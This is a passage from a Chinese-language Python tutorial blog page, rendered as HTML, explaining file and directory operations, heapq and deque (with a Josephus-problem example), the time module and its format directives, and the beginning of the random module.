class=\"line\"> </span><br><span class=\"line\">fp.readlines([size])  <span class=\"comment\">#把文件每一行作为一个list的一个成员，并返回这个list。其实它的内部是通过循环调用readline()来实现的。如果提供size参数，size是表示读取内容的总长，也就是说可能只读到文件的一部分。</span></span><br><span class=\"line\"> </span><br><span class=\"line\">fp.write(<span class=\"built_in\">str</span>)  <span class=\"comment\">#把str写到文件中，write()并不会在str后加上一个换行符</span></span><br><span class=\"line\"> </span><br><span class=\"line\">fp.writelines(seq)  <span class=\"comment\">#把seq的内容全部写到文件中(多行一次性写入)。这个函数也只是忠实地写入，不会在每行后面加上任何东西。</span></span><br><span class=\"line\"> </span><br><span class=\"line\">fp.close()  <span class=\"comment\">#关闭文件。python会在一个文件不用后自动关闭文件，不过这一功能没有保证，最好还是养成自己关闭的习惯。 如果一个文件在关闭后还对其进行操作会产生ValueError</span></span><br><span class=\"line\"> </span><br><span class=\"line\">fp.flush()  <span class=\"comment\">#把缓冲区的内容写入硬盘</span></span><br><span class=\"line\"> </span><br><span class=\"line\">fp.fileno()  <span class=\"comment\">#返回一个长整型的”文件标签“</span></span><br><span class=\"line\"> </span><br><span class=\"line\">fp.isatty()  <span class=\"comment\">#文件是否是一个终端设备文件（unix系统中的）</span></span><br><span class=\"line\"> </span><br><span class=\"line\">fp.tell()  <span class=\"comment\">#返回文件操作标记的当前位置，以文件的开头为原点</span></span><br><span class=\"line\"> </span><br><span class=\"line\">fp.<span class=\"built_in\">next</span>()  <span class=\"comment\">#返回下一行，并将文件操作标记位移到下一行。把一个file用于for … in file这样的语句时，就是调用next()函数来实现遍历的。</span></span><br><span class=\"line\"> </span><br><span class=\"line\">fp.seek(offset[,whence])  <span class=\"comment\">#将文件打操作标记移到offset的位置。这个offset一般是相对于文件的开头来计算的，一般为正数。但如果提供了whence参数就不一定了，whence可以为0表示从头开始计算，1表示以当前位置为原点计算。2表示以文件末尾为原点进行计算。需要注意，如果文件以a或a+的模式打开，每次进行写操作时，文件操作标记会自动返回到文件末尾。</span></span><br><span class=\"line\"> </span><br><span class=\"line\">fp.truncate([size])  <span class=\"comment\">#把文件裁成规定的大小，默认的是裁到当前文件操作标记的位置。如果size比文件的大小还要大，依据系统的不同可能是不改变文件，也可能是用0把文件补到相应的大小，也可能是以一些随机的内容加上去。</span></span><br><span class=\"line\"> </span><br><span class=\"line\">目录操作</span><br><span class=\"line\"> </span><br><span class=\"line\">os.mkdir(<span class=\"string\">&quot;file&quot;</span>)　　创建目录</span><br><span class=\"line\"> </span><br><span class=\"line\">shutil.copyfile(<span class=\"string\">&quot;oldfile&quot;</span>,<span class=\"string\">&quot;newfile&quot;</span>)　　复制文件:oldfile和newfile都只能是文件</span><br><span class=\"line\"> </span><br><span class=\"line\">shutil.copy(<span class=\"string\">&quot;oldfile&quot;</span>,<span class=\"string\">&quot;newfile&quot;</span>)  oldfile只能是文件夹，newfile可以是文件，也可以是目标目录</span><br><span class=\"line\"> </span><br><span class=\"line\">shutil.copytree(<span class=\"string\">&quot;olddir&quot;</span>,<span class=\"string\">&quot;newdir&quot;</span>)  复制文件夹.olddir和newdir都只能是目录，且newdir必须不存在</span><br><span class=\"line\"> </span><br><span class=\"line\">os.rename(<span class=\"string\">&quot;oldname&quot;</span>,<span class=\"string\">&quot;newname&quot;</span>)  重命名文件（目录）.文件或目录都是使用这条命令</span><br><span class=\"line\"> </span><br><span class=\"line\">shutil.move(<span class=\"string\">&quot;oldpos&quot;</span>,<span class=\"string\">&quot;newpos&quot;</span>)  移动文件（目录）</span><br><span class=\"line\"> </span><br><span class=\"line\">os.rmdir(<span class=\"string\">&quot;dir&quot;</span>)  只能删除空目录</span><br><span class=\"line\"> </span><br><span class=\"line\">shutil.rmtree(<span class=\"string\">&quot;dir&quot;</span>)  空目录、有内容的目录都可以删</span><br><span class=\"line\"> </span><br><span class=\"line\">os.chdir(<span class=\"string\">&quot;path&quot;</span>)  转换目录，换路径</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"集合、堆和双端队列-heap模块、deque类\"><a href=\"#集合、堆和双端队列-heap模块、deque类\" class=\"headerlink\" title=\"集合、堆和双端队列(heap模块、deque类)\"></a>集合、堆和双端队列(heap模块、deque类)</h3><p>集合(set)、堆(heap)、双端队列(deque)</p>\n<h4 id=\"堆导入-heapq-模块、双端队列导入collections模块。\"><a href=\"#堆导入-heapq-模块、双端队列导入collections模块。\" class=\"headerlink\" title=\"堆导入 heapq 模块、双端队列导入collections模块。\"></a>堆导入 heapq 模块、双端队列导入collections模块。</h4><table>\n<thead>\n<tr>\n<th>函数</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>heappush(heap,value)</td>\n<td>将value加入堆</td>\n</tr>\n<tr>\n<td>heappop(heap)</td>\n<td>将堆中的最小值弹出，并返回该最小值</td>\n</tr>\n<tr>\n<td>heapify(heap)</td>\n<td>将列表转换为堆，也就是重新安排列表中元素的顺序</td>\n</tr>\n<tr>\n<td>heapreplace(heap,value)</td>\n<td>将堆中的最小值弹出，并同时将value入堆</td>\n</tr>\n<tr>\n<td>nlargest(n,iter)</td>\n<td>返回可迭代对象中前n个最大值，以列表形式返回</td>\n</tr>\n<tr>\n<td>nsmallest(n,iter)</td>\n<td>返回可迭代对象中前n个最小值，以列表形式返回</td>\n</tr>\n<tr>\n<td>merge(*iter,key)</td>\n<td>合并多个有序的迭代对象，如果指定key，则对每个元素的排序会利用key指定的函数</td>\n</tr>\n</tbody></table>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> collections <span class=\"keyword\">import</span> deque</span><br></pre></td></tr></table></figure>\n\n<p>collections 是 python 内建的一个集合模块，里面封装了许多集合类，其中队列相关的集合只有一个：deque。<br>deque 是双边队列（double-ended queue），具有队列和栈的性质，在 list 的基础上增加了移动、旋转和增删等。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">d = collections.deque([])</span><br><span class=\"line\">d.append(<span class=\"string\">&#x27;a&#x27;</span>) <span class=\"comment\"># 在最右边添加一个元素，此时 d=deque(&#x27;a&#x27;)</span></span><br><span class=\"line\">d.appendleft(<span class=\"string\">&#x27;b&#x27;</span>) <span class=\"comment\"># 在最左边添加一个元素，此时 d=deque([&#x27;b&#x27;, &#x27;a&#x27;])</span></span><br><span class=\"line\">d.extend([<span class=\"string\">&#x27;c&#x27;</span>,<span class=\"string\">&#x27;d&#x27;</span>]) <span class=\"comment\"># 在最右边添加所有元素，此时 d=deque([&#x27;b&#x27;, &#x27;a&#x27;, &#x27;c&#x27;, &#x27;d&#x27;])</span></span><br><span class=\"line\">d.extendleft([<span class=\"string\">&#x27;e&#x27;</span>,<span class=\"string\">&#x27;f&#x27;</span>]) <span class=\"comment\"># 在最左边添加所有元素，此时 d=deque([&#x27;f&#x27;, &#x27;e&#x27;, &#x27;b&#x27;, &#x27;a&#x27;, &#x27;c&#x27;, &#x27;d&#x27;])</span></span><br><span class=\"line\">d.pop() <span class=\"comment\"># 将最右边的元素取出，返回 &#x27;d&#x27;，此时 d=deque([&#x27;f&#x27;, &#x27;e&#x27;, &#x27;b&#x27;, &#x27;a&#x27;, &#x27;c&#x27;])</span></span><br><span class=\"line\">d.popleft() <span class=\"comment\"># 将最左边的元素取出，返回 &#x27;f&#x27;，此时 d=deque([&#x27;e&#x27;, &#x27;b&#x27;, &#x27;a&#x27;, &#x27;c&#x27;])</span></span><br><span class=\"line\">d.rotate(-<span class=\"number\">2</span>) <span class=\"comment\"># 向左旋转两个位置（正数则向右旋转），此时 d=deque([&#x27;a&#x27;, &#x27;c&#x27;, &#x27;e&#x27;, &#x27;b&#x27;])</span></span><br><span class=\"line\">d.count(<span class=\"string\">&#x27;a&#x27;</span>) <span class=\"comment\"># 队列中&#x27;a&#x27;的个数，返回 1</span></span><br><span class=\"line\">d.remove(<span class=\"string\">&#x27;c&#x27;</span>) <span class=\"comment\"># 从队列中将&#x27;c&#x27;删除，此时 d=deque([&#x27;a&#x27;, &#x27;e&#x27;, &#x27;b&#x27;])</span></span><br><span class=\"line\">d.reverse() <span class=\"comment\"># 将队列倒序，此时 d=deque([&#x27;b&#x27;, &#x27;e&#x27;, &#x27;a&#x27;])</span></span><br></pre></td></tr></table></figure>\n\n<p>使用deque解决约瑟夫问题：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot; 约瑟夫算法</span></span><br><span class=\"line\"><span class=\"string\">据说著名犹太历史学家 Josephus 有过以下的故事：</span></span><br><span class=\"line\"><span class=\"string\">在罗马人占领桥塔帕特后，39个犹太人与 Josephus 及他的朋友躲到一个洞中，</span></span><br><span class=\"line\"><span class=\"string\">39个犹太人决定宁愿死也不要被敌人抓到，于是决定了一个自杀方式，41个人排成一个圆圈，</span></span><br><span class=\"line\"><span class=\"string\">由第1个人开始报数，每报数到第3人该人就必须自杀，然后再由下一个重新报数，</span></span><br><span class=\"line\"><span class=\"string\">直到所有人都自杀身亡为止。然而 Josephus 和他的朋友并不想自杀，</span></span><br><span class=\"line\"><span class=\"string\">问他俩安排的哪两个位置可以逃过这场死亡游戏？</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> collections</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">ysf</span>(<span class=\"params\">a, b</span>):</span></span><br><span class=\"line\">    d = collections.deque(<span class=\"built_in\">range</span>(<span class=\"number\">1</span>, a+<span class=\"number\">1</span>)) <span class=\"comment\"># 将每个人依次编号，放入到队列中</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> d:</span><br><span class=\"line\">        d.rotate(-b) <span class=\"comment\"># 队列向左旋转b步</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(d.pop()) <span class=\"comment\"># 将最右边的删除，即自杀的人</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    ysf(<span class=\"number\">41</span>,<span class=\"number\">3</span>) <span class=\"comment\"># 输出的是自杀的顺序。最后两个是16和31，说明这两个位置可以保证他俩的安全。</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"time模块\"><a href=\"#time模块\" class=\"headerlink\" title=\"time模块\"></a>time模块</h3><p>time 模块主要包含各种提供日期、时间功能的类和函数。该模块既提供了把日期、时间格式化为字符串的功能，也提供了从字符串恢复日期、时间的功能。</p>\n<p>在 Python 的交互式解释器中先导入 time 模块，然后输入 [e for e in dir(time) if not e.startswith(‘_’)] 命令，即可看到该模块所包含的全部属性和函数：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>[e <span class=\"keyword\">for</span> e <span class=\"keyword\">in</span> <span class=\"built_in\">dir</span>(time) <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> e.startswith(<span class=\"string\">&#x27;_&#x27;</span>)]</span><br><span class=\"line\">[<span class=\"string\">&#x27;altzone&#x27;</span>, <span class=\"string\">&#x27;asctime&#x27;</span>, <span class=\"string\">&#x27;clock&#x27;</span>, <span class=\"string\">&#x27;ctime&#x27;</span>, <span class=\"string\">&#x27;daylight&#x27;</span>, <span class=\"string\">&#x27;get_clock_info&#x27;</span>, <span class=\"string\">&#x27;gmtime&#x27;</span>, <span class=\"string\">&#x27;localtime&#x27;</span>, <span class=\"string\">&#x27;mktime&#x27;</span>, </span><br><span class=\"line\"><span class=\"string\">&#x27;monotonic&#x27;</span>,</span><br><span class=\"line\"> <span class=\"string\">&#x27;perf_counter&#x27;</span>, <span class=\"string\">&#x27;process_time&#x27;</span>, <span class=\"string\">&#x27;sleep&#x27;</span>, <span class=\"string\">&#x27;strftime&#x27;</span>, <span class=\"string\">&#x27;strptime&#x27;</span>, <span class=\"string\">&#x27;struct_time&#x27;</span>, <span class=\"string\">&#x27;time&#x27;</span>, <span class=\"string\">&#x27;timezone&#x27;</span>, <span class=\"string\">&#x27;tzname&#x27;</span>]</span><br></pre></td></tr></table></figure>\n\n<p>在 time 模块内提供了一个 time.struct_time 类，该类代表一个时间对象，它主要包含 9 个属性，每个属性的信息如下表所示：</p>\n<table>\n<thead>\n<tr>\n<th>字段名</th>\n<th>字段含义</th>\n<th>值</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>tm_year</td>\n<td>年</td>\n<td>如 2017、2018 等</td>\n</tr>\n<tr>\n<td>tm_mon</td>\n<td>月</td>\n<td>如 2、3 等，范围为 1~12</td>\n</tr>\n<tr>\n<td>tm_mday</td>\n<td>日</td>\n<td>如 2、3 等，范围为 1~31</td>\n</tr>\n<tr>\n<td>tm_hour</td>\n<td>时</td>\n<td>如 2、3 等，范围为 0~23</td>\n</tr>\n<tr>\n<td>tm_min</td>\n<td>分</td>\n<td>如 2、3 等，范围为 0~59</td>\n</tr>\n<tr>\n<td>tm_sec</td>\n<td>秒</td>\n<td>如 2、3 等，范围为 0~59</td>\n</tr>\n<tr>\n<td>tm_wday</td>\n<td>周</td>\n<td>周一为 0，范围为 0~6</td>\n</tr>\n<tr>\n<td>tm_yday</td>\n<td>一年内第几天</td>\n<td>如 65，范围 1~366</td>\n</tr>\n<tr>\n<td>tm_isdst</td>\n<td>夏时令</td>\n<td>0、1 或 -1</td>\n</tr>\n</tbody></table>\n<p>比如，Python 可以用 time.struct_time(tm_year=2018, tm_mon=5, tm_mday=2, tm_hour=8,  tm_min=0, tm_sec=30, tm_wday=3, tm_yday=1, tm_isdst=0) 很清晰地代表时间。</p>\n<p>此外，Python 还可以用一个包含 9 个元素的元组来代表时间，该元组的 9 个元素和 struct_time 对象中 9 个属性的含义是一一对应的。比如程序可以使用（2018, 5, 2, 8, 0, 30, 3, 1, 0）来代表时间。</p>\n<p>在日期、时间模块内常用的功能函数如下：</p>\n<p>time.asctime([t])：将时间元组或 struct_time 转换为时间字符串。如果不指定参数 t，则默认转换当前时间。</p>\n<p>time.ctime([secs])：将以秒数代表的时间转换为时间宇符串。</p>\n<p>time.gmtime([secs])：将以秒数代表的时间转换为 struct_time 对象。如果不传入参数，则使用当前时间。</p>\n<p>time.localtime([secs])：将以秒数代表的时间转换为代表当前时间的 struct_time 对象。如果不传入参数，则使用当前时间。</p>\n<p>time.mktime(t)：它是 localtime 的反转函数，用于将 struct_time 对象或元组代表的时间转换为从 1970 年 1 月 1 日 0 点整到现在过了多少秒。</p>\n<p>time.perf_counter()：返回性能计数器的值。以秒为单位。</p>\n<p>time.process_time()：返回当前进程使用 CPU 的时间。以秒为单位。</p>\n<p>time.sleep(secs)：暂停 secs 秒，什么都不干。</p>\n<p>time.strftime(format[, t])：将时间元组或 struct_time 对象格式化为指定格式的时间字符串。如果不指定参数 t，则默认转换当前时间。</p>\n<p>time.strptime(string[, format])：将字符串格式的时间解析成 struct_time 对象。</p>\n<p>time.time()：返回从 1970 年 1 月 1 日 0 点整到现在过了多少秒。</p>\n<p>time.timezone：返回本地时区的时间偏移，以秒为单位。</p>\n<p>time.tzname：返回本地时区的名字。</p>\n<p>下面程序示范了 time 棋块的功能函数：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"comment\"># 将当前时间转换为时间字符串</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.asctime())</span><br><span class=\"line\"><span class=\"comment\"># 将指定时间转换时间字符串，时间元组的后面3个元素没有设置</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.asctime((<span class=\"number\">2018</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">11</span>, <span class=\"number\">8</span>, <span class=\"number\">23</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span> ,<span class=\"number\">0</span>))) <span class=\"comment\"># Mon Feb  4 11:08:23 2018</span></span><br><span class=\"line\"><span class=\"comment\"># 将以秒数为代表的时间转换为时间字符串</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.ctime(<span class=\"number\">30</span>)) <span class=\"comment\"># Thu Jan  1 08:00:30 1970</span></span><br><span class=\"line\"><span class=\"comment\"># 将以秒数为代表的时间转换为struct_time对象。</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.gmtime(<span class=\"number\">30</span>))</span><br><span class=\"line\"><span class=\"comment\"># 将当前时间转换为struct_time对象。</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.gmtime())</span><br><span class=\"line\"><span class=\"comment\"># 将以秒数为代表的时间转换为代表当前时间的struct_time对象</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.localtime(<span class=\"number\">30</span>))</span><br><span class=\"line\"><span class=\"comment\"># 将元组格式的时间转换为秒数代表的时间</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.mktime((<span class=\"number\">2018</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">11</span>, <span class=\"number\">8</span>, <span class=\"number\">23</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span> ,<span class=\"number\">0</span>))) <span class=\"comment\"># 1517713703.0</span></span><br><span class=\"line\"><span class=\"comment\"># 返回性能计数器的值</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.perf_counter())</span><br><span class=\"line\"><span class=\"comment\"># 返回当前进程使用CPU的时间</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.process_time())</span><br><span class=\"line\"><span class=\"comment\">#time.sleep(10)</span></span><br><span class=\"line\"><span class=\"comment\"># 将当前时间转换为指定格式的字符串</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.strftime(<span class=\"string\">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>))</span><br><span class=\"line\">st = <span class=\"string\">&#x27;2018年3月20日&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># 将指定时间字符串恢复成struct_time对象。</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.strptime(st, <span class=\"string\">&#x27;%Y年%m月%d日&#x27;</span>))</span><br><span class=\"line\"><span class=\"comment\"># 返回从1970年1970年1月1日0点整到现在过了多少秒。</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.time())</span><br><span class=\"line\"><span class=\"comment\"># 返回本地时区的时间偏移，以秒为单位</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.timezone) <span class=\"comment\"># 在国内东八区输出-28800</span></span><br></pre></td></tr></table></figure>\n\n<p>运行上面程序，可以看到如下输出结果：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Fri Feb <span class=\"number\">22</span> <span class=\"number\">11</span>:<span class=\"number\">28</span>:<span class=\"number\">39</span> <span class=\"number\">2019</span></span><br><span class=\"line\">Mon Feb  <span class=\"number\">4</span> <span class=\"number\">11</span>:08:<span class=\"number\">23</span> <span class=\"number\">2018</span></span><br><span class=\"line\">Thu Jan  <span class=\"number\">1</span> 08:<span class=\"number\">00</span>:<span class=\"number\">30</span> <span class=\"number\">1970</span></span><br><span class=\"line\">time.struct_time(tm_year=<span class=\"number\">1970</span>, tm_mon=<span class=\"number\">1</span>, tm_mday=<span class=\"number\">1</span>, tm_hour=<span class=\"number\">0</span>, tm_min=<span class=\"number\">0</span>, tm_sec=<span class=\"number\">30</span>, tm_wday=<span class=\"number\">3</span>, tm_yday=<span class=\"number\">1</span>, </span><br><span class=\"line\">tm_isdst=<span class=\"number\">0</span>)</span><br><span class=\"line\">time.struct_time(tm_year=<span class=\"number\">2019</span>, tm_mon=<span class=\"number\">2</span>, tm_mday=<span class=\"number\">22</span>, tm_hour=<span class=\"number\">3</span>, tm_min=<span class=\"number\">28</span>, tm_sec=<span class=\"number\">39</span>, tm_wday=<span class=\"number\">4</span>, tm_yday=<span class=\"number\">53</span>, </span><br><span class=\"line\">tm_isdst=<span class=\"number\">0</span>)</span><br><span class=\"line\">time.struct_time(tm_year=<span class=\"number\">1970</span>, tm_mon=<span class=\"number\">1</span>, tm_mday=<span class=\"number\">1</span>, tm_hour=<span class=\"number\">8</span>, tm_min=<span class=\"number\">0</span>, tm_sec=<span class=\"number\">30</span>, tm_wday=<span class=\"number\">3</span>, tm_yday=<span class=\"number\">1</span>, </span><br><span class=\"line\">tm_isdst=<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"number\">1517713703.0</span></span><br><span class=\"line\"><span class=\"number\">0.0</span></span><br><span class=\"line\"><span class=\"number\">0.140625</span></span><br><span class=\"line\"><span class=\"number\">2019</span>-02-<span class=\"number\">22</span> <span class=\"number\">11</span>:<span class=\"number\">28</span>:<span class=\"number\">39</span></span><br><span class=\"line\">time.struct_time(tm_year=<span class=\"number\">2018</span>, tm_mon=<span class=\"number\">3</span>, tm_mday=<span class=\"number\">20</span>, tm_hour=<span class=\"number\">0</span>, tm_min=<span class=\"number\">0</span>, tm_sec=<span class=\"number\">0</span>, tm_wday=<span class=\"number\">1</span>, tm_yday=<span class=\"number\">79</span>, </span><br><span class=\"line\">tm_isdst=-<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"number\">1550806119.4960592</span></span><br><span class=\"line\">-<span class=\"number\">28800</span></span><br></pre></td></tr></table></figure>\n\n<p>time 模块中的 strftime() 和 strptime() 两个函数互为逆函数，其中 strftime() 用于将 struct_time 对象或时间元组转换为时间字符串；而 strptime() 函数用于将时间字符串转换为 struct_time  对象。这两个函数都涉及编写格式模板，比如上面程序中使用 %Y 代表年、%m 代表月、%d 代表日、%H 代表时、%M 代表分、%S  代表秒。这两个函数所需要的时间格式字符串支持的指令如下表所示：</p>\n<table>\n<thead>\n<tr>\n<th>指 令</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>%a</td>\n<td>本地化的星期几的缩写名，比如 Sun 代表星期天</td>\n</tr>\n<tr>\n<td>%A</td>\n<td>本地化的星期几的完整名</td>\n</tr>\n<tr>\n<td>%b</td>\n<td>本地化的月份的缩写名，比如 Jan 代表一月</td>\n</tr>\n<tr>\n<td>%B</td>\n<td>本地化的月份的完整名</td>\n</tr>\n<tr>\n<td>%c</td>\n<td>本地化的日期和时间的表示形式</td>\n</tr>\n<tr>\n<td>%d</td>\n<td>代表一个月中第几天的数值，范固： 01~31</td>\n</tr>\n<tr>\n<td>%H</td>\n<td>代表 24 小时制的小时，范围：00~23</td>\n</tr>\n<tr>\n<td>%I</td>\n<td>代表 12 小时制的小时，范围：01~12</td>\n</tr>\n<tr>\n<td>%j</td>\n<td>一年中第几天，范围：001~366</td>\n</tr>\n<tr>\n<td>%m</td>\n<td>代表月份的数值，范围：01~12</td>\n</tr>\n<tr>\n<td>%M</td>\n<td>代表分钟的数值，范围：00~59</td>\n</tr>\n<tr>\n<td>%p</td>\n<td>上午或下午的本地化方式。当使用 strptime() 函数并使用 %I 指令解析小时时，%p 只影响小时字段</td>\n</tr>\n<tr>\n<td>%S</td>\n<td>代表分钟的数值，范围：00<del>61。该范围确实是 00</del>61，60 在表示闰秒的时间戳时有效，而 61 则是由于一些历史原因造成的</td>\n</tr>\n<tr>\n<td>%U</td>\n<td>代表一年中表示第几周，以星期天为每周的第一天，范围：00~53。在这种方式下，一年中第一个星期天被认为处于第一周。当使用 strptime() 函数解析时间字符串时，只有同时指定了星期几和年份该指令才会有效</td>\n</tr>\n<tr>\n<td>%w</td>\n<td>代表星期几的数值，范围：0~6，其中 0 代表周日</td>\n</tr>\n<tr>\n<td>%W</td>\n<td>代表一年小第几周，以星期一为每周的第一天，范围：00~53。在这种方式下，一年中第一个星期一被认为处于第一周。当使用 strptime() 函数解析时间字符串时，只有同时指定了星期几和年份该指令才会有效</td>\n</tr>\n<tr>\n<td>%x</td>\n<td>本地化的日期的表示形式</td>\n</tr>\n<tr>\n<td>%X</td>\n<td>本地化的时间的表示形式</td>\n</tr>\n<tr>\n<td>%y</td>\n<td>年份的缩写，范围：00~99，比如 2018 年就简写成 18</td>\n</tr>\n<tr>\n<td>%Y</td>\n<td>年份的完整形式。如 2018</td>\n</tr>\n<tr>\n<td>%z</td>\n<td>显示时区偏移</td>\n</tr>\n<tr>\n<td>%Z</td>\n<td>时区名（如果时区不行在，则显示为空）</td>\n</tr>\n<tr>\n<td>%%</td>\n<td>用于代表%符号</td>\n</tr>\n</tbody></table>\n<h3 id=\"random-模块\"><a href=\"#random-模块\" class=\"headerlink\" title=\"random 模块\"></a>random 模块</h3><p> ython中的random模块用于生成随机数。</p>\n<p>下面具体介绍random模块的功能：</p>\n<p>1.random.random()</p>\n<p> #用于生成一个0到1的</p>\n<p>随机浮点数：0&lt;= n &lt; 1.0</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span> <span class=\"keyword\">import</span> random  </span><br><span class=\"line\"><span class=\"number\">2</span> a = random.random()</span><br><span class=\"line\"><span class=\"number\">3</span> <span class=\"built_in\">print</span> (a)  </span><br></pre></td></tr></table></figure>\n\n<p>2.random.uniform(a,b) </p>\n<p>#用于生成一个指定范围内的随机符点数，两个参数其中一个是上限，一个是下限。如果a &gt; b，则生成的随机数n: b &lt;= n &lt;= a。如果 a &lt;b， 则 a &lt;= n &lt;= b。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span> <span class=\"keyword\">import</span> random  </span><br><span class=\"line\"><span class=\"number\">2</span> <span class=\"built_in\">print</span>(random.uniform(<span class=\"number\">1</span>,<span class=\"number\">10</span>))  </span><br><span class=\"line\"><span class=\"number\">3</span> <span class=\"built_in\">print</span>(random.uniform(<span class=\"number\">10</span>,<span class=\"number\">1</span>)) </span><br></pre></td></tr></table></figure>\n\n<p>3.random.randint(a, b)</p>\n<p> #用于生成一个指定范围内的整数。其中参数a是下限，参数b是上限，生成的随机数n: a &lt;= n &lt;= b</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span> <span class=\"keyword\">import</span> random  </span><br><span class=\"line\"><span class=\"number\">2</span> <span class=\"built_in\">print</span>(random.randint(<span class=\"number\">1</span>,<span class=\"number\">10</span>))  </span><br></pre></td></tr></table></figure>\n\n<p>4.random.randrange([start], stop[, step])</p>\n<p> #从指定范围内，按指定基数递增的集合中 获取一个随机数。</p>\n<p>random.randrange(10, 30, 2)，结果相当于从[10, 12, 14, 16, … 26, 28]序列中获取一个随机数。</p>\n<p>random.randrange(10, 30, 2)在结果上与 random.choice(range(10, 30, 2) 等效。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span> <span class=\"keyword\">import</span> random  </span><br><span class=\"line\"><span class=\"number\">2</span> <span class=\"built_in\">print</span>(random.randrange(<span 